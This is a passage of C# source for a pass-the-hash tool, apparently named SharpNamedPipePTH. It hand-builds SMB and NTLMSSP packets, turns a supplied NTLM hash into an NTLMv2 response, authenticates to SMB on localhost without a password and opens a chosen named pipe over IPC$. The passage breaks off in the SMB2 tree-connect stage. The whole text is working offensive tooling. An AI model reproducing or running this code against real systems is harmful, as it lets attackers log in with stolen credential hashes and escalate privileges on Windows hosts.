using System;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Net.Sockets;
using System.Collections.Specialized;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SharpNamedPipePTH
{
    public class NamedpipePTH
    {

        public static void displayHelp(string message)
        {
            Console.WriteLine("{0} \r\nNamedPipePTH.exe username:<user> domain:<domain>  hash:<ntlm> pipename:<pipename>", message);
            return;
        }

        public static void NamedPipePTH(string User, string Domain, string Hash, string PipeName, bool forceSMB1)
        {

            //User Set
            string Target = "localhost";
            string username = User;
            string domain = Domain;
            string pipename = PipeName;
            string hash = Hash;
            bool ForceSMB1 = forceSMB1;
            bool debug = true;


            //Trackers
            bool Login_Successful = false;
            bool SMBConnect_Failed = false;
            bool SMB_Signing = false;
            string Output_Username;
            string processID = BitConverter.ToString(BitConverter.GetBytes(Process.GetCurrentProcess().Id)).Replace("-", "");
            string[] processID2 = processID.Split('-');
            StringBuilder output = new StringBuilder();
            int SMB2_Message_ID = 0;
            //Communication
            byte[] SMBClientReceive = null;
            //Packet Reqs
            byte[] Process_ID_Bytes = Utilities.ConvertStringToByteArray(processID.ToString());
            byte[] SMB_Session_ID = null;
            byte[] Session_Key = null;
            byte[] SMB_Session_Key_Length = null;
            byte[] SMB_Negotiate_Flags = null;
            byte[] SMB2_Tree_ID = null;
            byte[] SMB_Client_Send = null;
            byte[] SMB_FID = new byte[2];
            byte[] SMB_Named_Pipe_Bytes = null;
            byte[] SMB_User_ID = null;
            byte[] SMB_Header = null;
            byte[] SMB2_Header = null;
            byte[] SMB_Data = null;
            byte[] SMB2_Data = null;
            byte[] NetBIOS_Session_Service = null;
            byte[] NTLMSSP_Negotiate = null;
            byte[] NTLMSSP_Auth = null;
            byte[] SMB_Sign = null;
            byte[] SMB_Signature = null;
            byte[] SMB_Signature2 = null;
            byte[] SMB2_Sign = null;
            byte[] SMB2_Signature = null;
            byte[] SMB_Signing_Sequence = null;
            OrderedDictionary Packet_SMB_Header = null;
            OrderedDictionary Packet_SMB2_Header = null;
            OrderedDictionary Packet_SMB_Data = null;
            OrderedDictionary Packet_SMB2_Data = null;
            OrderedDictionary Packet_NTLMSSP_Negotiate = null;
            OrderedDictionary Packet_NTLMSSP_Auth = null;
            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();

            if (String.IsNullOrEmpty(username) || String.IsNullOrEmpty(hash) || String.IsNullOrEmpty(Target))
            {
                displayHelp("Missing Required Params");
            }
            else
            {
                if (hash.Contains(":"))
                    hash = hash.Split(':').Last();
            }
            if (!string.IsNullOrEmpty(domain))
                Output_Username = domain + '\\' + username;
            else
                Output_Username = username;


            TcpClient SMBClient = new TcpClient();
            SMBClient.Client.ReceiveTimeout = 60000;

            try
            {
                SMBClient.Connect(Target, 445);
            }
            catch
            {
                output.AppendLine("Could not connect to Target");
            }

            if (SMBClient.Connected)
            {
                if (debug) { output.AppendLine(String.Format("Connected to {0}", Target)); }
                NetworkStream SMBClientStream = SMBClient.GetStream();
                SMBClientReceive = new byte[1024];
                string SMBClientStage = "NegotiateSMB";

                while (SMBClientStage != "exit")
                {
                    if (debug) { output.AppendLine(String.Format("Current Stage: {0}", SMBClientStage)); }
                    switch (SMBClientStage)
                    {
                        case "NegotiateSMB":
                            {
                                Packet_SMB_Header = new OrderedDictionary();
                                Packet_SMB_Header = SMBConnect.SMBHeader(new byte[] { 0x72 }, new byte[] { 0x18 }, new byte[] { 0x01, 0x48 }, new byte[] { 0xff, 0xff }, Process_ID_Bytes, new byte[] { 0x00, 0x00 });
                                Packet_SMB_Data = SMBConnect.SMBNegotiateProtocolRequest(ForceSMB1);
                                SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                if (BitConverter.ToString(new byte[] { SMBClientReceive[4], SMBClientReceive[5], SMBClientReceive[6], SMBClientReceive[7] }).ToLower() == "ff-53-4d-42")
                                {
                                    ForceSMB1 = true;
                                    if (debug) { output.AppendLine("Using SMB1"); }
                                    SMBClientStage = "NTLMSSPNegotiate";
                                    if (BitConverter.ToString(new byte[] { SMBClientReceive[39] }).ToLower() == "0f")
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is Enabled"); }
                                        SMB_Signing = true;
                                        SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                        SMB_Negotiate_Flags = new byte[] { 0x15, 0x82, 0x08, 0xa0 };

                                    }
                                    else
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is not Enforced"); }
                                        SMB_Signing = false;
                                        SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                        SMB_Negotiate_Flags = new byte[] { 0x05, 0x82, 0x08, 0xa0 };

                                    }
                                }
                                else
                                {
                                    if (debug) { output.AppendLine("Using SMB2"); }
                                    SMBClientStage = "NegotiateSMB2";
                                    if (BitConverter.ToString(new byte[] { SMBClientReceive[70] }) == "03")
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is Enabled"); }
                                        SMB_Signing = true;
                                        SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                        SMB_Negotiate_Flags = new byte[] { 0x15, 0x82, 0x08, 0xa0 };
                                    }
                                    else
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is not Enforced"); }
                                        SMB_Signing = false;
                                        SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                        SMB_Negotiate_Flags = new byte[] { 0x05, 0x80, 0x08, 0xa0 };
                                    }
                                }
                            }
                            break;
                        case "NegotiateSMB2":
                            {
                                SMB2_Message_ID = 1;
                                Packet_SMB2_Header = new OrderedDictionary();
                                SMB2_Tree_ID = new byte[] { 0x00, 0x00, 0x00, 0x00 };
                                SMB_Session_ID = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                                Packet_SMB2_Header = SMBConnect.SMB2Header(new byte[] { 0x00, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                Packet_SMB2_Data = SMBConnect.SMB2NegotiateProtocolRequest();
                                SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                SMBClientStage = "NTLMSSPNegotiate";

                            }
                            break;
                        case "NTLMSSPNegotiate":
                            {
                                SMB_Client_Send = null;
                                if (ForceSMB1)
                                {
                                    Packet_SMB_Header = SMBConnect.SMBHeader(new byte[] { 0x73 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0xff, 0xff }, Process_ID_Bytes, new byte[] { 0x00, 0x00 });

                                    if (SMB_Signing)
                                    {
                                        Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                    }
                                    Packet_NTLMSSP_Negotiate = SMBConnect.NTLMSSPNegotiate(SMB_Negotiate_Flags, null);
                                    SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                    NTLMSSP_Negotiate = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Negotiate);
                                    Packet_SMB_Data = SMBConnect.SMBSessionSetupAndXRequest(NTLMSSP_Negotiate);
                                    SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                    NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                    SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                }
                                else
                                {
                                    Packet_SMB2_Header = new OrderedDictionary();
                                    SMB2_Message_ID += 1;
                                    Packet_SMB2_Header = SMBConnect.SMB2Header(new byte[] { 0x01, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                    Packet_NTLMSSP_Negotiate = SMBConnect.NTLMSSPNegotiate(SMB_Negotiate_Flags, null);
                                    SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                    NTLMSSP_Negotiate = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Negotiate);
                                    Packet_SMB2_Data = SMBConnect.SMB2SessionSetupRequest(NTLMSSP_Negotiate);
                                    SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                    NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                    SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                }
                                SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                SMBClientStage = "exit";
                            }
                            break;

                    }
                }
                if (debug) { output.AppendLine(String.Format("Authenticating to {0}", Target)); }
                string SMB_NTLSSP = BitConverter.ToString(SMBClientReceive);
                SMB_NTLSSP = SMB_NTLSSP.Replace("-", "");
                int SMB_NTLMSSP_Index = SMB_NTLSSP.IndexOf("4E544C4D53535000");
                int SMB_NTLMSSP_Bytes_Index = SMB_NTLMSSP_Index / 2;
                int SMB_Domain_Length = Utilities.DataLength(SMB_NTLMSSP_Bytes_Index + 12, SMBClientReceive);
                int SMB_Target_Length = Utilities.DataLength(SMB_NTLMSSP_Bytes_Index + 40, SMBClientReceive);
                SMB_Session_ID = Utilities.GetByteRange(SMBClientReceive, 44, 51);
                byte[] SMB_NTLM_challenge = Utilities.GetByteRange(SMBClientReceive, SMB_NTLMSSP_Bytes_Index + 24, SMB_NTLMSSP_Bytes_Index + 31);
                byte[] SMB_Target_Details = null;
                SMB_Target_Details = Utilities.GetByteRange(SMBClientReceive, (SMB_NTLMSSP_Bytes_Index + 56 + SMB_Domain_Length), (SMB_NTLMSSP_Bytes_Index + 55 + SMB_Domain_Length + SMB_Target_Length));
                byte[] SMB_Target_Time_Bytes = Utilities.GetByteRange(SMB_Target_Details, SMB_Target_Details.Length - 12, SMB_Target_Details.Length - 5);
                string hash2 = "";
                for (int i = 0; i < hash.Length - 1; i += 2) { hash2 += (hash.Substring(i, 2) + "-"); };
                byte[] NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(hash.Replace("-", "")));
                string Auth_Hostname = Environment.MachineName;
                byte[] Auth_Hostname_Bytes = Encoding.Unicode.GetBytes(Auth_Hostname);
                byte[] Auth_Domain_Bytes = Encoding.Unicode.GetBytes(domain);
                byte[] Auth_Username_Bytes = Encoding.Unicode.GetBytes(username);
                byte[] Auth_Domain_Length = BitConverter.GetBytes(Auth_Domain_Bytes.Length);
                Auth_Domain_Length = new byte[] { Auth_Domain_Length[0], Auth_Domain_Length[1] };
                byte[] Auth_Username_Length = BitConverter.GetBytes(Auth_Username_Bytes.Length);
                Auth_Username_Length = new byte[] { Auth_Username_Length[0], Auth_Username_Length[1] };
                byte[] Auth_Hostname_Length = BitConverter.GetBytes(Auth_Hostname_Bytes.Length);
                Auth_Hostname_Length = new byte[] { Auth_Hostname_Length[0], Auth_Hostname_Length[1] };
                byte[] Auth_Domain_offset = new byte[] { 0x40, 0x00, 0x00, 0x00 };
                byte[] Auth_Username_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + 64);
                byte[] Auth_Hostname_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + 64);
                byte[] Auth_LM_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + 64);
                byte[] Auth_NTLM_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + 88);
                HMACMD5 HMAC_MD5 = new HMACMD5();
                HMAC_MD5.Key = NTLM_hash_bytes;
                string Username_And_Target = username.ToUpper();
                byte[] Username_Bytes = Encoding.Unicode.GetBytes(Username_And_Target);
                byte[] Username_And_Target_bytes = Username_Bytes.Concat(Auth_Domain_Bytes).ToArray();
                byte[] NTLMv2_hash = HMAC_MD5.ComputeHash(Username_And_Target_bytes);
                Random r = new Random();
                byte[] Client_Challenge_Bytes = new byte[8];
                r.NextBytes(Client_Challenge_Bytes);



                byte[] Security_Blob_Bytes = (new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                    .Concat(SMB_Target_Time_Bytes)
                    .Concat(Client_Challenge_Bytes)
                    .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 })
                    .Concat(SMB_Target_Details)
                    .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                byte[] Server_Challenge_And_Security_Blob_Bytes = Server_Challenge_And_Security_Blob_Bytes = SMB_NTLM_challenge.Concat(Security_Blob_Bytes).ToArray();
                HMAC_MD5.Key = NTLMv2_hash;
                byte[] NTLMv2_Response = HMAC_MD5.ComputeHash(Server_Challenge_And_Security_Blob_Bytes);
                if (SMB_Signing)
                {
                    byte[] Session_Base_Key = HMAC_MD5.ComputeHash(NTLMv2_Response);
                    Session_Key = Session_Base_Key;
                    HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                    HMAC_SHA256.Key = Session_Key;
                }
                NTLMv2_Response = NTLMv2_Response.Concat(Security_Blob_Bytes).ToArray();
                byte[] NTLMv2_Response_Length = BitConverter.GetBytes(NTLMv2_Response.Length);
                NTLMv2_Response_Length = new byte[] { NTLMv2_Response_Length[0], NTLMv2_Response_Length[1] };
                byte[] SMB_Session_Key_offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + NTLMv2_Response.Length + 88);

                byte[] NTLMSSP_response = (new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 })
                        .Concat(Auth_LM_Offset)
                        .Concat(NTLMv2_Response_Length)
                        .Concat(NTLMv2_Response_Length)
                        .Concat(Auth_NTLM_Offset)
                        .Concat(Auth_Domain_Length)
                        .Concat(Auth_Domain_Length)
                        .Concat(Auth_Domain_offset)
                        .Concat(Auth_Username_Length)
                        .Concat(Auth_Username_Length)
                        .Concat(Auth_Username_Offset)
                        .Concat(Auth_Hostname_Length)
                        .Concat(Auth_Hostname_Length)
                        .Concat(Auth_Hostname_Offset)
                        .Concat(SMB_Session_Key_Length)
                        .Concat(SMB_Session_Key_Length)
                        .Concat(SMB_Session_Key_offset)
                        .Concat(SMB_Negotiate_Flags)
                        .Concat(Auth_Domain_Bytes)
                        .Concat(Auth_Username_Bytes)
                        .Concat(Auth_Hostname_Bytes)
                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                        .Concat(NTLMv2_Response).ToArray();
                if (ForceSMB1)
                {
                    Packet_SMB_Header = new OrderedDictionary();
                    SMB_User_ID = new byte[] { SMBClientReceive[32], SMBClientReceive[33] };
                    Packet_SMB_Header = SMBConnect.SMBHeader(new byte[] { 0x73 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0xff, 0xff }, Process_ID_Bytes, new byte[] { 0x00, 0x00 });

                    if (SMB_Signing)
                    {
                        Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                    }

                    Packet_SMB_Header["SMBHeader_UserID"] = SMB_User_ID;
                    Packet_NTLMSSP_Negotiate = SMBConnect.NTLMSSPAuth(NTLMSSP_response);
                    SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                    NTLMSSP_Negotiate = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Negotiate);
                    Packet_SMB_Data = SMBConnect.SMBSessionSetupAndXRequest(NTLMSSP_Negotiate);
                    SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                    NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                    SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                }
                else
                {
                    SMB2_Message_ID += 1;
                    Packet_SMB2_Header = SMBConnect.SMB2Header(new byte[] { 0x01, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                    Packet_NTLMSSP_Auth = SMBConnect.NTLMSSPAuth(NTLMSSP_response);
                    SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                    NTLMSSP_Auth = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Auth);
                    Packet_SMB2_Data = SMBConnect.SMB2SessionSetupRequest(NTLMSSP_Auth);
                    SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                    NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                    SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                }



                SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);

                if (ForceSMB1)
                {
                    if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 9, 12)) == "00-00-00-00")
                    {
                        if (debug) { output.AppendLine("Authentication Successful"); }
                        Login_Successful = true;
                    }
                    else
                    {
                        output.AppendLine("Unable to authenticate to Target.");
                        Console.WriteLine(output.ToString());
                    }
                }
                else
                {
                    if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 12, 15)) == "00-00-00-00")
                    {
                        if (debug) { output.AppendLine("Authentication Successful"); }
                        Login_Successful = true;
                    }
                    else
                    {
                        output.AppendLine("Unable to Authenticate to Target.");
                        Console.WriteLine(output.ToString());
                    }
                }

                if (debug) { output.AppendLine(String.Format("Login Status: {0}", Login_Successful)); }
                if (Login_Successful)
                {
                    byte[] SMB_Path_Bytes;
                    string SMB_Path = "\\\\" + Target + "\\IPC$";

                    if (ForceSMB1)
                    {
                        SMB_Path_Bytes = Encoding.UTF8.GetBytes(SMB_Path).Concat(new byte[] { 0x00 }).ToArray();
                    }
                    else
                    {
                        SMB_Path_Bytes = Encoding.Unicode.GetBytes(SMB_Path);
                    }

                    int SMB_Signing_Counter = 0;
                    byte[] SMB_Tree_ID = new byte[2];
                    string SMB_Client_Stage_Next = "";
                    if (ForceSMB1)
                    {
                        SMBClientStage = "TreeConnectAndXRequest";
                        while (SMBClientStage != "exit" && SMBConnect_Failed == false)
                        {
                            if (debug) { output.AppendLine(String.Format("Current Stage {0}", SMBClientStage)); }
                            switch (SMBClientStage)
                            {
                                case "TreeConnectAndXRequest":
                                    {
                                        Packet_SMB_Header = new OrderedDictionary();
                                        Packet_SMB_Header = SMBConnect.SMBHeader(new byte[] { 0x75 }, new byte[] { 0x18 }, new byte[] { 0x01, 0x48 }, new byte[] { 0xff, 0xff }, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter = 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBConnect.SMBTreeConnectAndXRequest(SMB_Path_Bytes);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature2 = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature2;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }

                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "CreateAndXRequest";
                                    }
                                    break;
                                case "CreateAndXRequest":
                                    {
                                        byte[] pipeBytes = Encoding.UTF8.GetBytes(pipename);
                                        List<byte> PTH_Pipe_List = new List<byte>();
                                        foreach (byte pipeByte in pipeBytes)
                                        {
                                            PTH_Pipe_List.Add(pipeByte);
                                            PTH_Pipe_List.Add(0x00);

                                        }
                                        SMB_Named_Pipe_Bytes = PTH_Pipe_List.ToArray(); // new byte[] { 0x74, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00, 0x70, 0x00, 0x69, 0x00, 0x70, 0x00, 0x65, 0x00, 0x73, 0x00 }; //testpipes, original was svcctl
                                        SMB_Tree_ID = Utilities.GetByteRange(SMBClientReceive, 28, 29);
                                        Packet_SMB_Header = SMBConnect.SMBHeader(new byte[] { 0xa2 }, new byte[] { 0x18 }, new byte[] { 0x02, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBConnect.SMBNTCreateAndXRequest(SMB_Named_Pipe_Bytes);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature2 = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature2;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "CloseRequest";

                                    }
                                    break;


                                case "CloseRequest":
                                    {
                                        Packet_SMB_Header = SMBConnect.SMBHeader(new byte[] { 0x04 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBConnect.SMBCloseRequest(new byte[] { 0x00, 0x40 });
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "TreeDisconnect";
                                    }
                                    break;
                                case "TreeDisconnect":
                                    {
                                        Packet_SMB_Header = SMBConnect.SMBHeader(new byte[] { 0x71 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBConnect.SMBTreeDisconnectRequest();
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);


                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "Logoff";
                                    }
                                    break;
                                case "Logoff":
                                    {
                                        Packet_SMB_Header = SMBConnect.SMBHeader(new byte[] { 0x74 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0x34, 0xfe }, Process_ID_Bytes, SMB_User_ID);

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBConnect.SMBLogoffAndXRequest();
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);


                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "exit";
                                    }
                                    break;
                            }

                        }
                    }
                    else
                    {
                        SMBClientStage = "TreeConnect";
                        HMACSHA256 HMAC_SHA256 = new HMACSHA256();

                        while (SMBClientStage != "exit" && SMBConnect_Failed == false)
                        {
                            if (debug) { output.AppendLine(String.Format("Current Stage {0}", SMBClientStage)); }
                            switch (SMBClientStage)
                            {
                                case "TreeConnect":
                                    {
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBConnect.SMB2Header(new byte[] { 0x03, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        Packet_SMB2_Data = SMBConnect.SMB2TreeConnectRequest(SMB_Path_Bytes);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
